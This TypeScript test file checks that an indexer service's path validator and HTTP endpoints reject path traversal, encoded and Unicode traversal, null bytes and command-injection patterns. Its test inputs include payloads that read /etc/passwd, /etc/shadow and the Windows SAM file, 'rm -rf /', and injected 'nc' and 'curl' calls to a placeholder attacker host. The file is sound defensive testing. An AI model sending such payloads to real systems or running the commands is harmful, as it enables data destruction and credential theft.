/**
 * CRITICAL SECURITY TESTS for Path Traversal Vulnerability Fixes
 * P0 Security Issue - Indexer Service
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import { FileIndexerService } from './service.js';
import { validateFileSystemPath, validateFilePatterns } from './path-validation.js';

describe('Indexer Service Security Tests - P0 Critical', () => {
  let service: FileIndexerService;
  let server: any;

  beforeEach(async () => {
    // Use a different port for testing
    service = new FileIndexerService(3001);
    // Start server without blocking
    server = service.start();
    // Give it a moment to start
    await new Promise((resolve) => setTimeout(resolve, 100));
  });

  afterEach(async () => {
    if (service) {
      await service.stop();
    }
  });

  describe('Path Validation Module', () => {
    describe('validateFileSystemPath', () => {
      it('should BLOCK basic path traversal attacks', () => {
        const attacks = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          'folder/../../../etc/passwd',
          'src/../../etc/shadow',
          'config/../../../proc/version',
        ];

        attacks.forEach((attack) => {
          expect(() => validateFileSystemPath(attack), `Should block: ${attack}`).toThrow();
        });
      });

      it('should BLOCK encoded path traversal attacks', () => {
        const attacks = [
          '..%2F..%2F..%2Fetc%2Fpasswd',
          '..%2f..%2f..%2fetc%2fpasswd',
          '..%5C..%5C..%5Cwindows%5Csystem32',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ];

        attacks.forEach((attack) => {
          expect(() => validateFileSystemPath(attack), `Should block encoded: ${attack}`).toThrow();
        });
      });

      it('should BLOCK null byte injection', () => {
        const attacks = ['path\0malicious', 'file.txt\0\0\0', 'config\0/etc/passwd'];

        attacks.forEach((attack) => {
          expect(
            () => validateFileSystemPath(attack),
            `Should block null byte: ${attack}`,
          ).toThrow();
        });
      });

      it('should BLOCK absolute paths when not allowed', () => {
        const attacks = [
          '/etc/passwd',
          '/etc/shadow',
          '/proc/version',
          '/sys/kernel',
          'C:\\Windows\\System32',
          '\\\\?\\C:\\Windows\\System32',
        ];

        attacks.forEach((attack) => {
          expect(
            () => validateFileSystemPath(attack),
            `Should block absolute: ${attack}`,
          ).toThrow();
        });
      });

      it('should BLOCK suspicious system directory patterns', () => {
        const attacks = [
          'folder/etc/passwd',
          'folder/proc/cpuinfo',
          'folder/sys/kernel',
          'folder/windows/system32',
          'folder/program files/app',
          'folder/users/admin',
        ];

        attacks.forEach((attack) => {
          expect(
            () => validateFileSystemPath(attack),
            `Should block suspicious: ${attack}`,
          ).toThrow();
        });
      });

      it('should BLOCK Unicode homograph attacks', () => {
        const attacks = [
          'folder‥/etc/passwd', // Unicode two-dot leader
          'folder﹒/etc/passwd', // Unicode small full stop
          'folder．/etc/passwd', // Unicode fullwidth full stop
          'folder‥．/etc/passwd', // Mixed unicode dots
        ];

        attacks.forEach((attack) => {
          expect(() => validateFileSystemPath(attack), `Should block unicode: ${attack}`).toThrow();
        });
      });

      it('should BLOCK control characters', () => {
        const attacks = [
          'file\x00.txt',
          'path\r\n/etc/passwd',
          'folder\t/etc/passwd',
          'file\x1b[31m.txt',
        ];

        attacks.forEach((attack) => {
          expect(
            () => validateFileSystemPath(attack),
            `Should block control chars: ${attack}`,
          ).toThrow();
        });
      });

      it('should BLOCK overly long paths', () => {
        const longPath = 'a'.repeat(4097);
        expect(() => validateFileSystemPath(longPath)).toThrow('Path too long');
      });

      it('should ALLOW legitimate file paths', () => {
        const legitimate = [
          'src/index.ts',
          'docs/readme.md',
          'packages/utils/helper.js',
          'tests/security.test.ts',
          'config/app.json',
          'public/css/style.css',
          'scripts/build.sh',
          'assets/images/logo.png',
          'data/import.csv',
          'lib/math/calculator.js',
        ];

        legitimate.forEach((path) => {
          expect(() => validateFileSystemPath(path), `Should allow: ${path}`).not.toThrow();
        });
      });
    });

    describe('validateFilePatterns', () => {
      it('should BLOCK patterns with dangerous characters', () => {
        const dangerousPatterns = [
          ['$(rm -rf /)'],
          ['`cat /etc/passwd`'],
          ['file|cat'],
          ['file; rm -rf /'],
          ['file && cat /etc/passwd'],
        ];

        dangerousPatterns.forEach((patterns) => {
          expect(
            () => validateFilePatterns(patterns),
            `Should block dangerous: ${patterns}`,
          ).toThrow();
        });
      });

      it('should BLOCK patterns with path traversal', () => {
        const traversalPatterns = [
          ['../../../etc/passwd'],
          ['safe.ts', '../../../dangerous'],
          ['**/../../../etc/*'],
        ];

        traversalPatterns.forEach((patterns) => {
          expect(
            () => validateFilePatterns(patterns),
            `Should block traversal: ${patterns}`,
          ).toThrow();
        });
      });

      it('should ALLOW safe glob patterns', () => {
        const safePatterns = [
          ['*.ts', '*.js'],
          ['src/**/*.ts', 'docs/*.md'],
          ['test/**/*.test.ts'],
          ['config/*.json'],
        ];

        safePatterns.forEach((patterns) => {
          expect(
            () => validateFilePatterns(patterns),
            `Should allow safe: ${patterns}`,
          ).not.toThrow();
        });
      });
    });
  });

  describe('HTTP API Security Tests', () => {
    it('should BLOCK path traversal in /index endpoint', async () => {
      const maliciousPayload = {
        path: '../../../etc/passwd',
        includePatterns: ['*.conf'],
      };

      const response = await request(server).post('/index').send(maliciousPayload).expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Path traversal');
    });

    it('should BLOCK encoded path traversal in /index endpoint', async () => {
      const maliciousPayload = {
        path: '..%2F..%2F..%2Fetc%2Fpasswd',
      };

      const response = await request(server).post('/index').send(maliciousPayload).expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('traversal');
    });

    it('should BLOCK malicious patterns in /index endpoint', async () => {
      const maliciousPayload = {
        path: 'src',
        includePatterns: ['$(rm -rf /)', '`cat /etc/passwd`'],
      };

      const response = await request(server).post('/index').send(maliciousPayload).expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('dangerous');
    });

    it('should BLOCK path traversal in /file endpoint', async () => {
      const maliciousPayload = {
        path: '../../../etc/passwd',
      };

      const response = await request(server).post('/file').send(maliciousPayload).expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('traversal');
    });

    it('should BLOCK path traversal in DELETE /file endpoint', async () => {
      const maliciousPayload = {
        path: '../../../etc/passwd',
      };

      const response = await request(server).delete('/file').send(maliciousPayload).expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('traversal');
    });

    it('should ALLOW legitimate requests to /index endpoint', async () => {
      const legitimatePayload = {
        path: 'src',
        includePatterns: ['*.ts', '*.js'],
        excludePatterns: ['*.test.ts'],
      };

      // This might fail due to missing files, but should not fail due to security validation
      const response = await request(server).post('/index').send(legitimatePayload);

      // Should not be a 400 security error
      expect(response.status).not.toBe(400);
      if (response.status === 400) {
        expect(response.body.error).not.toContain('traversal');
        expect(response.body.error).not.toContain('dangerous');
      }
    });

    it('should ALLOW legitimate requests to /file endpoint', async () => {
      const legitimatePayload = {
        path: 'src/index.ts',
      };

      const response = await request(server).post('/file').send(legitimatePayload);

      // Should not be a 400 security error
      expect(response.status).not.toBe(400);
      if (response.status === 400) {
        expect(response.body.error).not.toContain('traversal');
      }
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('should prevent Linux system file access via multiple vectors', async () => {
      const attacks = [
        { endpoint: '/index', payload: { path: '../../../etc/passwd' } },
        { endpoint: '/index', payload: { path: '..%2f..%2f..%2fetc%2fpasswd' } },
        { endpoint: '/index', payload: { path: '/etc/passwd' } },
        { endpoint: '/index', payload: { path: 'config/../../../etc/passwd' } },
        { endpoint: '/file', payload: { path: '../../../etc/shadow' } },
        { endpoint: '/file', payload: { path: '/proc/version' } },
        { endpoint: '/file', payload: { path: 'folder/../../../sys/kernel' } },
      ];

      for (const attack of attacks) {
        const response = await request(server).post(attack.endpoint).send(attack.payload);

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toMatch(/traversal|dangerous|suspicious|absolute/);
      }
    });

    it('should prevent Windows system file access via multiple vectors', async () => {
      const attacks = [
        { endpoint: '/index', payload: { path: '..\\..\\..\\windows\\system32\\config\\sam' } },
        { endpoint: '/index', payload: { path: '..%5C..%5C..%5Cwindows%5Csystem32' } },
        { endpoint: '/index', payload: { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts' } },
        { endpoint: '/file', payload: { path: 'windows/system32/config/sam' } },
        { endpoint: '/file', payload: { path: 'program files/internet explorer/iexplore.exe' } },
      ];

      for (const attack of attacks) {
        const response = await request(server).post(attack.endpoint).send(attack.payload);

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toMatch(/traversal|dangerous|suspicious|absolute/);
      }
    });

    it('should prevent command injection via patterns', async () => {
      const injectionAttacks = [
        {
          endpoint: '/index',
          payload: {
            path: 'src',
            includePatterns: ['$(rm -rf /)', '`whoami`', 'file|nc attacker.com 4444'],
          },
        },
        {
          endpoint: '/index',
          payload: {
            path: 'src',
            excludePatterns: ['file && cat /etc/passwd', 'file; curl attacker.com'],
          },
        },
      ];

      for (const attack of injectionAttacks) {
        const response = await request(server).post(attack.endpoint).send(attack.payload);

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toMatch(/dangerous/);
      }
    });
  });
});
